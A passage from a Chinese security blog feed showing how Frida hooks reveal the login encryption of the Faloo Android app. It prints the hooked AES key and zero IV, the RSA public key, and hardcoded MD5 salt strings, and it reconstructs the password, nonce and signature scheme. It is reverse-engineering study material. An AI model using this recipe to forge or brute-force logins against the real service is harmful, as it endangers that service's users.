class="line">WiQ5rxBBzdG9HfOKnWEHkyGQuDz2vnYQzFR2fuTJe7YjbcTp1LAOdAi5rdAdj5Qj7r2NdThsIMHIT4dREE9QyUCPKyivgtPqucVrRCmEw5nWVYG99ogV3qZDAWZ2foU4unNJhG6H7RMit5Bm59rFJ1h8DH2ZUARuY6h69kzkeeURP83+PzXQpA+L3JFxQtlDrQIkvwMVyWf7lpq7IXihx2TjEcZ6quvW1pNip/3yu2QEDbVEQ1cvqJfNFzPvnc1HM6NYgQgwguvdLMQajRad6CS2Iec0RbOlAE/M1LCRCV8PLC78hxFvgnI8blnHw3nCoO7uy2wN7v3aKxWBtaDlbHun8erKj1msrlouXCTV3HJzah/BwMt+aDNrM2WtJQ4A+JugmXFAPC7SZaLNYqn9xA==</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1578407350853.png" alt="1578407350853"></p><p>这里hook到了加密算法和密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] 算法名：AES|Dec密钥:DD240BF148903189BF8DAE0C220C9591</span><br><span class="line">[*] 算法名：AES|Hex密钥:4444323430424631343839303331383942463844414530433232304339353931</span><br></pre></td></tr></table></figure><p>偏移模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模式填充:AES/CBC/PKCS5Padding</span><br></pre></td></tr></table></figure><p>iv向量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iv向量(hex):00000000000000000000000000000000</span><br></pre></td></tr></table></figure><h4><span id="password加密过程分析">Password加密过程分析</span></h4><p>输出中可以看到其加密之前的数据为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num=0&amp;userid=1388888888&amp;Password=9c9c5f3bff756cf5395265b6c5f0d8f0&amp;tid=2&amp;ts=1578400865589&amp;nonce=fb4f89a9464e3a318111b337f92a9f1c&amp;resign=e8ca11ce1d27aa18ed6840617b8cbcf7&amp;pwdcode=YTEyMzQ1Ng==</span><br><span class="line">&amp;time=2020-01-07 21:31:33&amp;wt=1&amp;uuid=77a0332f1ca14daf9337f941bcc86e70&amp;appversion=3.4.8&amp;Type=Android&amp;xp=0</span><br></pre></td></tr></table></figure><p>数据中userid为用户名，Password为密码，这里的密码是密文<code>9c9c5f3bff756cf5395265b6c5f0d8f0</code>，这里并不知道是什么密文。此密文并非输入的密码的md5值。在输出中我们可以直接搜索这一段密文。</p><p>搜索到<code>9c9c5f3bff756cf5395265b6c5f0d8f0</code>为如下输出结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[*] ======================================</span><br><span class="line">[*] update:@345Kie(873_dfbKe&gt;d3&lt;.d23432=d67d5e705490b20f8d8a3c8731d4c535</span><br><span class="line">[*] java.lang.Exception</span><br><span class="line">at java.security.MessageDigest.digest(Native Method)</span><br><span class="line">at java.security.MessageDigest.digest(MessageDigest.java:278)</span><br><span class="line">at java.security.MessageDigest.digest(Native Method)</span><br><span class="line">at com.faloo.network.util.MD5.MD5(Proguard:22)</span><br><span class="line">at com.faloo.util.EncryptUtil._e16(Native Method)</span><br><span class="line">at com.faloo.util.EncryptUtil.EncryptPwd(Proguard:23)</span><br><span class="line">at com.faloo.network.service.a.c.a(Proguard:119)</span><br><span class="line">at com.faloo.app.activity.LoginPageActivity$13.a(Proguard:941)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableCreate.b(Proguard:40)</span><br><span class="line">at io.reactivex.e.a(Proguard:11194)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableSubscribeOn$a.run(Proguard:96)</span><br><span class="line">at io.reactivex.k$a.run(Proguard:463)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.run(Proguard:66)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.call(Proguard:57)</span><br><span class="line">at java.util.concurrent.FutureTask.run(FutureTask.java:237)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:152)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:265)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1112)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:587)</span><br><span class="line">at java.lang.Thread.run(Thread.java:818)</span><br><span class="line"></span><br><span class="line">[*] ======================================</span><br><span class="line">[*] digest结果(hex):9c9c5f3bff756cf5395265b6c5f0d8f0</span><br><span class="line">[*] digest结果(base64):nJxfO/91bPU5UmW2xfDY8A==</span><br><span class="line">[*] digest结果(hex):9c9c5f3bff756cf5395265b6c5f0d8f0</span><br><span class="line">[*] digest结果(base64):nJxfO/91bPU5UmW2xfDY8A==</span><br></pre></td></tr></table></figure><p>在这个过程中输入的为<code>@345Kie(873_dfbKe&gt;d3&lt;.d23432=d67d5e705490b20f8d8a3c8731d4c535</code>输出的<code>9c9c5f3bff756cf5395265b6c5f0d8f0</code></p><p>通过md5加密对比如下图，发现此过程为md5加密过程。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1578404071511.png" alt="1578404071511"></p><p><code>@345Kie(873_dfbKe&gt;d3&lt;.d23432=d67d5e705490b20f8d8a3c8731d4c535</code>中，前一段<code>@345Kie(873_dfbKe&gt;d3&lt;.d23432=</code>并没有搜索到，可能为固定值拼接，通过多此测试发现确实为固定值拼接。故直接搜索后32位<code>d67d5e705490b20f8d8a3c8731d4c535</code>跟到如下输出过程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[*] ======================================</span><br><span class="line">[*] update:EW234@![#$&amp;]*&#123;,OP&#125;Kd^w349Op+-32_a1234561578400865589</span><br><span class="line">[*] java.lang.Exception</span><br><span class="line">at java.security.MessageDigest.digest(Native Method)</span><br><span class="line">at java.security.MessageDigest.digest(MessageDigest.java:278)</span><br><span class="line">at java.security.MessageDigest.digest(Native Method)</span><br><span class="line">at com.faloo.network.util.MD5.MD5(Proguard:22)</span><br><span class="line">at com.faloo.util.EncryptUtil._e16(Native Method)</span><br><span class="line">at com.faloo.util.EncryptUtil.EncryptPwd(Proguard:23)</span><br><span class="line">at com.faloo.network.service.a.c.a(Proguard:119)</span><br><span class="line">at com.faloo.app.activity.LoginPageActivity$13.a(Proguard:941)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableCreate.b(Proguard:40)</span><br><span class="line">at io.reactivex.e.a(Proguard:11194)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableSubscribeOn$a.run(Proguard:96)</span><br><span class="line">at io.reactivex.k$a.run(Proguard:463)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.run(Proguard:66)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.call(Proguard:57)</span><br><span class="line">at java.util.concurrent.FutureTask.run(FutureTask.java:237)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:152)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:265)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1112)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:587)</span><br><span class="line">at java.lang.Thread.run(Thread.java:818)</span><br><span class="line"></span><br><span class="line">[*] ======================================</span><br><span class="line">[*] digest结果(hex):d67d5e705490b20f8d8a3c8731d4c535</span><br><span class="line">[*] digest结果(base64):1n1ecFSQsg+NijyHMdTFNQ==</span><br><span class="line">[*] digest结果(hex):d67d5e705490b20f8d8a3c8731d4c535</span><br><span class="line">[*] digest结果(base64):1n1ecFSQsg+NijyHMdTFNQ==</span><br></pre></td></tr></table></figure><p>如上输入为<code>EW234@![#$&amp;]*{,OP}Kd^w349Op+-32_a1234561578400865589</code>输出为<code>d67d5e705490b20f8d8a3c8731d4c535</code>。这里<code>EW234@![#$&amp;]*{,OP}Kd^w349Op+-32_</code>同样为固定值，<code>a123456</code>为我们输入的密码，<code>1578400865589</code>为时间戳。此过程为MD5加密</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1578404464976.png" alt="1578404464976"></p><p>至此我们可以获取到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num=0&amp;userid=1388888888&amp;Password=9c9c5f3bff756cf5395265b6c5f0d8f0&amp;tid=2&amp;ts=1578400865589&amp;nonce=fb4f89a9464e3a318111b337f92a9f1c&amp;resign=e8ca11ce1d27aa18ed6840617b8cbcf7&amp;pwdcode=YTEyMzQ1Ng==</span><br><span class="line">&amp;time=2020-01-07 21:31:33&amp;wt=1&amp;uuid=77a0332f1ca14daf9337f941bcc86e70&amp;appversion=3.4.8&amp;Type=Android&amp;xp=0</span><br></pre></td></tr></table></figure><p>aes加密前的数据中password的加密过程：</p><p>大致流程为：</p><ol><li>string1 = <code>EW234@![#$&amp;]*{,OP}Kd^w349Op+-32_</code>+<code>密码</code>+时间戳，对string1进行md5加密</li><li>对md5(string1)前拼接@345Kie(873_dfbKe&gt;d3&lt;.d23432=，再进行一次MD5加密得到最后的password加密值。</li></ol><h4><span id="once加密过程分析">once加密过程分析</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num=0&amp;userid=1388888888&amp;Password=9c9c5f3bff756cf5395265b6c5f0d8f0&amp;tid=2&amp;ts=1578400865589&amp;nonce=fb4f89a9464e3a318111b337f92a9f1c&amp;resign=e8ca11ce1d27aa18ed6840617b8cbcf7&amp;pwdcode=YTEyMzQ1Ng==</span><br><span class="line">&amp;time=2020-01-07 21:31:33&amp;wt=1&amp;uuid=77a0332f1ca14daf9337f941bcc86e70&amp;appversion=3.4.8&amp;Type=Android&amp;xp=0</span><br></pre></td></tr></table></figure><p>如上数据中的ts为时间戳即加密用到的时间戳，客户端将此时间戳发给服务端，因为在密码加密中用到了这个时间戳，所以服务器进行密码对比的时候也要用到这个时间戳，所以这个时间戳是一一对应的。</p><p>once值<code>fb4f89a9464e3a318111b337f92a9f1c</code>同样的方法去搜索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[*] update:1578400865530</span><br><span class="line">[*] java.lang.Exception</span><br><span class="line">at java.security.MessageDigest.digest(Native Method)</span><br><span class="line">at org.faloo.app.pay.a.a(Proguard:40)</span><br><span class="line">at com.faloo.app.activity.LoginPageActivity.e(Proguard:483)</span><br><span class="line">at com.faloo.app.activity.LoginPageActivity.b(Proguard:111)</span><br><span class="line">at com.faloo.app.activity.LoginPageActivity$3.a(Proguard:531)</span><br><span class="line">at com.faloo.app.activity.LoginPageActivity$3.onNext(Proguard:517)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableObserveOn$ObserveOnObserver.drainNormal(Proguard:200)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableObserveOn$ObserveOnObserver.run(Proguard:252)</span><br><span class="line">at io.reactivex.android.b.b$b.run(Proguard:109)</span><br><span class="line">at android.os.Handler.handleCallback(Handler.java:739)</span><br><span class="line">at android.os.Handler.dispatchMessage(Handler.java:95)</span><br><span class="line">at android.os.Looper.loop(Looper.java:135)</span><br><span class="line">at android.app.ActivityThread.main(ActivityThread.java:5293)</span><br><span class="line">at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:372)</span><br><span class="line">at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:903)</span><br><span class="line">at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:698)</span><br><span class="line"></span><br><span class="line">[*] ======================================</span><br><span class="line">[*] digest结果(hex):fb4f89a9464e3a318111b337f92a9f1c</span><br><span class="line">[*] digest结果(base64):+0+JqUZOOjGBEbM3+SqfHA==</span><br></pre></td></tr></table></figure><p>得到如上过程，输入<code>1578400865530</code>输出once值。同样为md5加密。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1578404968965.png" alt="1578404968965"></p><p>此时间戳并非在加密过程中用到，可能在后端并未做校验。</p><h4><span id="resign加密过程分析">resign加密过程分析</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num=0&amp;userid=1388888888&amp;Password=9c9c5f3bff756cf5395265b6c5f0d8f0&amp;tid=2&amp;ts=1578400865589&amp;nonce=fb4f89a9464e3a318111b337f92a9f1c&amp;resign=e8ca11ce1d27aa18ed6840617b8cbcf7&amp;pwdcode=YTEyMzQ1Ng==</span><br><span class="line">&amp;time=2020-01-07 21:31:33&amp;wt=1&amp;uuid=77a0332f1ca14daf9337f941bcc86e70&amp;appversion=3.4.8&amp;Type=Android&amp;xp=0</span><br></pre></td></tr></table></figure><p>这个数据中还有一个<code>e8ca11ce1d27aa18ed6840617b8cbcf7</code>为resign签名值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[*] ======================================</span><br><span class="line">[*] update:a1f*(DV&lt;&gt;ME29p08adsfKQ@N&gt;FEP*(F&amp;G)&amp;B)R@PVDbvnTPFPSDFQ&gt;QM@o9i8t5P_)(SGB?9c9c5f3bff756cf5395265b6c5f0d8f0fb4f89a9464e3a318111b337f92a9f1c</span><br><span class="line">[*] java.lang.Exception</span><br><span class="line">at java.security.MessageDigest.digest(Native Method)</span><br><span class="line">at java.security.MessageDigest.digest(MessageDigest.java:278)</span><br><span class="line">at java.security.MessageDigest.digest(Native Method)</span><br><span class="line">at com.faloo.network.util.MD5.MD5(Proguard:22)</span><br><span class="line">at com.faloo.util.EncryptUtil._e14(Native Method)</span><br><span class="line">at com.faloo.util.EncryptUtil.EncryptRePwd(Proguard:46)</span><br><span class="line">at com.faloo.network.service.a.c.a(Proguard:120)</span><br><span class="line">at com.faloo.app.activity.LoginPageActivity$13.a(Proguard:941)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableCreate.b(Proguard:40)</span><br><span class="line">at io.reactivex.e.a(Proguard:11194)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableSubscribeOn$a.run(Proguard:96)</span><br><span class="line">at io.reactivex.k$a.run(Proguard:463)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.run(Proguard:66)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.call(Proguard:57)</span><br><span class="line">at java.util.concurrent.FutureTask.run(FutureTask.java:237)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:152)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:265)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1112)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:587)</span><br><span class="line">at java.lang.Thread.run(Thread.java:818)</span><br><span class="line"></span><br><span class="line">[*] ======================================</span><br><span class="line">[*] digest结果(hex):e8ca11ce1d27aa18ed6840617b8cbcf7</span><br><span class="line">[*] digest结果(base64):6MoRzh0nqhjtaEBhe4y89w==</span><br><span class="line">[*] digest结果(hex):e8ca11ce1d27aa18ed6840617b8cbcf7</span><br><span class="line">[*] digest结果(base64):6MoRzh0nqhjtaEBhe4y89w==</span><br></pre></td></tr></table></figure><p>该签名与<code>a1f*(DV&lt;&gt;ME29p08adsfKQ@N&gt;FEP*(F&amp;G)&amp;B)R@PVDbvnTPFPSDFQ&gt;QM@o9i8t5P_)(SGB?9c9c5f3bff756cf5395265b6c5f0d8f0fb4f89a9464e3a318111b337f92a9f1c</code>有关。此过程也为MD5加密。其中一段为9c9c5f3bff756cf5395265b6c5f0d8f0为password值。<code>fb4f89a9464e3a318111b337f92a9f1c</code>为once值。前面的一段<code>a1f*(DV&lt;&gt;ME29p08adsfKQ@N&gt;FEP*(F&amp;G)&amp;B)R@PVDbvnTPFPSDFQ&gt;QM@o9i8t5P_)(SGB?</code>为固定值。</p><p>所以签名值resign为固定值+password+once然后进行md5加密。</p><p>而最后的值<code>uuid=77a0332f1ca14daf9337f941bcc86e70</code>可能为用户名标识或者手机设备识别码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num=0&amp;userid=1388888888&amp;Password=9c9c5f3bff756cf5395265b6c5f0d8f0&amp;tid=2&amp;ts=1578400865589&amp;nonce=fb4f89a9464e3a318111b337f92a9f1c&amp;resign=e8ca11ce1d27aa18ed6840617b8cbcf7&amp;pwdcode=YTEyMzQ1Ng==</span><br><span class="line">&amp;time=2020-01-07 21:31:33&amp;wt=1&amp;uuid=77a0332f1ca14daf9337f941bcc86e70&amp;appversion=3.4.8&amp;Type=Android&amp;xp=0</span><br></pre></td></tr></table></figure><p>pwdcode值为<code>YTEyMzQ1Ng==</code>为密码的base64。</p><p>自此如上加密数据所有部分都通过hook输出内容进行了分析。</p><h4><span id="rsa加密过程分析">RSA加密过程分析</span></h4><p>在hook输出内容中还有，RSA加密过程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">[*] ======================================</span><br><span class="line">[*] RSA密钥:MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCDiI/dCs429FC75NYnF82omzzAweej2VdpdaKP3DL0D/s3Hg7cnVTGBh6yRrKYI9cvBKorxdrCEaW0SXZYBH5nvmCg8qyzO8jBj08ISiukEQuqG2oS0L2sbcQl0MV7rExsyO0vlPpND7klBWikAIO1UfZW1ab/EWit1XkaXCr6nQIDAQAB</span><br><span class="line">[*] java.lang.Exception</span><br><span class="line">at javax.crypto.Cipher.getInstance(Native Method)</span><br><span class="line">at com.faloo.util.SignUtils.encrypt(Proguard:104)</span><br><span class="line">at com.faloo.util.EncryptUtil._e8(Native Method)</span><br><span class="line">at com.faloo.util.EncryptUtil.getRSAEncrypt(Proguard:166)</span><br><span class="line">at com.faloo.network.module.b.d(Proguard:39)</span><br><span class="line">at com.faloo.network.util.e.a(Proguard:101)</span><br><span class="line">at com.faloo.network.service.a.c.a(Proguard:141)</span><br><span class="line">at com.faloo.app.activity.LoginPageActivity$13.a(Proguard:941)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableCreate.b(Proguard:40)</span><br><span class="line">at io.reactivex.e.a(Proguard:11194)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableSubscribeOn$a.run(Proguard:96)</span><br><span class="line">at io.reactivex.k$a.run(Proguard:463)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.run(Proguard:66)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.call(Proguard:57)</span><br><span class="line">at java.util.concurrent.FutureTask.run(FutureTask.java:237)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:152)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:265)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1112)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:587)</span><br><span class="line">at java.lang.Thread.run(Thread.java:818)</span><br><span class="line"></span><br><span class="line">[*] ======================================</span><br><span class="line">[*] 模式填充:RSA/ECB/PKCS1Padding</span><br><span class="line">[*] java.lang.Exception</span><br><span class="line">at javax.crypto.Cipher.doFinal(Native Method)</span><br><span class="line">at com.faloo.util.SignUtils.encrypt(Proguard:106)</span><br><span class="line">at com.faloo.util.EncryptUtil._e8(Native Method)</span><br><span class="line">at com.faloo.util.EncryptUtil.getRSAEncrypt(Proguard:166)</span><br><span class="line">at com.faloo.network.module.b.d(Proguard:39)</span><br><span class="line">at com.faloo.network.util.e.a(Proguard:101)</span><br><span class="line">at com.faloo.network.service.a.c.a(Proguard:141)</span><br><span class="line">at com.faloo.app.activity.LoginPageActivity$13.a(Proguard:941)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableCreate.b(Proguard:40)</span><br><span class="line">at io.reactivex.e.a(Proguard:11194)</span><br><span class="line">at io.reactivex.internal.operators.observable.ObservableSubscribeOn$a.run(Proguard:96)</span><br><span class="line">at io.reactivex.k$a.run(Proguard:463)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.run(Proguard:66)</span><br><span class="line">at io.reactivex.internal.schedulers.ScheduledRunnable.call(Proguard:57)</span><br><span class="line">at java.util.concurrent.FutureTask.run(FutureTask.java:237)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:152)</span><br><span class="line">at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:265)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1112)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:587)</span><br><span class="line">at java.lang.Thread.run(Thread.java:818)</span><br><span class="line"></span><br><span class="line">[*] ======================================</span><br><span class="line">[*] doFinal参数:DD240BF148903189BF8DAE0C220C9591</span><br><span class="line">[*] doFinal结果(hex):028f36e0538d52fe0b243c02cc68fc1a8a741215e868ef500e87142a84850db9e8cbacbf2e4b77b0c5088b9879b3f99d0fd57b239ffa7894b672722143affe03b504b00bf4d4c82264215d61d5e66c8db0f18f5463a544a7a8dff86f77e6ef16b885091bc6f5034003a300a1d9b38022612b4369f47b17eba5a3adfb5857f6c5</span><br><span class="line">[*] doFinal结果(base64):Ao824FONUv4LJDwCzGj8Gop0EhXoaO9QDocUKoSFDbnoy6y/Lkt3sMUIi5h5s/mdD9V7I5/6eJS2cnIhQ6/+A7UEsAv01MgiZCFdYdXmbI2w8Y9UY6VEp6jf+G935u8WuIUJG8b1A0ADowCh2bOAImErQ2n0exfrpaOt+1hX9sU=</span><br></pre></td></tr></table></figure><p>如上为RSA加密过程公钥为<code>MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCDiI/dCs429FC75NYnF82omzzAweej2VdpdaKP3DL0D/s3Hg7cnVTGBh6yRrKYI9cvBKorxdrCEaW0SXZYBH5nvmCg8qyzO8jBj08ISiukEQuqG2oS0L2sbcQl0MV7rExsyO0vlPpND7klBWikAIO1UfZW1ab/EWit1XkaXCr6nQIDAQAB</code></p><p>模式填充:<code>RSA/ECB/PKCS1Padding</code></p><p>加密数据为：<code>DD240BF148903189BF8DAE0C220C9591</code></p><p>加密结果为：<code>Ao824FONUv4LJDwCzGj8Gop0EhXoaO9QDocUKoSFDbnoy6y/Lkt3sMUIi5h5s/mdD9V7I5/6eJS2cnIhQ6/+A7UEsAv01MgiZCFdYdXmbI2w8Y9UY6VEp6jf+G935u8WuIUJG8b1A0ADowCh2bOAImErQ2n0exfrpaOt+1hX9sU=</code></p><p>这个过程是为了加密AES密钥，因为RSA加密的加密数据长度是有限的。</p><blockquote><p>RSA一次能加密的明文长度与密钥长度成正比：</p><p>len_in_byte(raw_data) = len_in_bit(key)/8 -11，如 1024bit 的密钥，一次能加密的内容长度为 1024/8 -11 = 117 byte。</p><p>所以非对称加密一般都用于加密对称加密算法的密钥，而不是直接加密内容</p></blockquote><p>因为AES是对称加密</p><blockquote><p>对称加密就是指，<strong>加密和解密使用同一个密钥的加密方式。</strong></p><p>发送方使用密钥将明文数据加密成密文，然后发送出去，接收方收到密文后，使用同一个密钥将密文解密成明文读取。</p><p>优点：<strong>加密计算量小、速度块，适合对大量数据进行加密的场景。</strong></p></blockquote><p>所以通常流量数据为AES，但是AES存在安全问题就是，AES的密钥要是被截获了就可以任意解密数据。</p><p>所以目前APP中的加密套路就是:</p><p><strong>客户端：流量数据通过AES加密发送给服务端，同时AES密钥随机生成通过RSA公钥加密发服务端</strong></p><p><strong>服务端：服务端接收到RSA加密后的AES密钥通过RSA私钥进行解密得到AES密钥，然后通过AES密钥解密流量数据进行验证。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;traceviewfrida&quot;&gt;Traceview+frida&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;TraceView 是 Android SDK 中内置的一个工具，它可以加载 &lt;strong&gt;trace&lt;/strong&gt; 文件，用图形的形式展示&lt;strong
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>frida-Hook实战一</title>
    <link href="https://uknowsec.cn/posts/notes/frida-Hook%E5%AE%9E%E6%88%98%E4%B8%80.html"/>
    <id>https://uknowsec.cn/posts/notes/frida-Hook实战一.html</id>
    <published>2019-12-23T12:00:04.000Z</published>
    <updated>2019-12-23T12:00:55.899Z</updated>
    
